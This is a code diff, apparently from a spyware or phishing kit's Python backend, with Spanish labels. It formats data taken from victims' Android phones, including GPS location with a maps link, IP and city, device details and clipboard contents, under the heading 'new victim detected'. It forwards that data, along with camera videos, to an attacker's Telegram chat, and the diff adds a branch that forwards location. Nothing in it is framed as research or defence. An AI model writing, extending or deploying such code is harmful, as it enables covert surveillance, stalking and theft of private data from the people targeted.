@@ -48,30 +48,28 @@ def formato_mensaje(dtype, data):
         di = data.get("deviceInfo") or {}
         ip = data.get("ipInfo") or {}
         clip = data.get("clipboard", "—")
-        cam = data.get("camera", "")
-        lineas = [f"🎯 Nueva víctima detectada", sep]
+        lineas = ["🎯 Nueva víctima detectada", sep]
         if lat and lon:
             lineas += [f"📍 Ubicación",
                        f"  • Latitud: {lat}",
                        f"  • Longitud: {lon}",
                        f"  • Maps: https://maps.google.com/?q={lat},{lon}"]
         if ip:
-            lineas += [f"🌐 Red",
+            lineas += ["🌐 Red",
                        f"  • IP: {ip.get('ip','—')}",
                        f"  • Ciudad: {ip.get('city','—')}",
                        f"  • País: {ip.get('country','—')}",
                        f"  • Org: {ip.get('org','—')}"]
         if di:
-            bat = di.get("batteryLevel","—")
-            lineas += [f"📱 Dispositivo",
+            lineas += ["📱 Dispositivo",
                        f"  • Marca: {di.get('brand','—')}",
                        f"  • Tipo: {di.get('deviceType','—')}",
                        f"  • Android: {di.get('osVersion','—')}",
-                       f"  • Batería: {bat}",
+                       f"  • Batería: {di.get('batteryLevel','—')}",
                        f"  • Red: {di.get('networkType','—')}",
                        f"  • Pantalla: {di.get('screenRes','—')}"]
         if clip and clip != "—":
-            lineas += [f"📋 Portapapeles", f"  {clip}"]
+            lineas += ["📋 Portapapeles", f"  {clip}"]
         return "\n".join(lineas)
     elif dtype == "clipboard":
         return f"📋 Portapapeles\n{sep}\n{data if isinstance(data, str) else json.dumps(data)}"
@@ -169,6 +167,16 @@ class handler(BaseHTTPRequestHandler):
                     dur = b.get("duration", 0)
                     r = tg_file(tok, "sendVideo", "video", "video.mp4", "video/mp4",
                                 filedata, {"chat_id": chat, "caption": f"🎥 Video — Cámara {cam_es} ({dur}s)"})
+                    return self.reply({"ok": True, "telegram": r})
+                elif dtype == "location" and isinstance(data, dict):
+                    lat = data.get("latitude")
+                    lon = data.get("longitude")
+                    if lat and lon:
+                        tg(tok, "sendLocation", {"chat_id": chat,
+                                                  "latitude": lat,
+                                                  "longitude": lon})
+                    txt = formato_mensaje(dtype, data)
+                    r = tg(tok, "sendMessage", {"chat_id": chat, "text": txt})
                     return self.reply({"ok": True, "telegram": r})
                 else:
                     txt = formato_mensaje(dtype, data if data else b.get("data", {}))
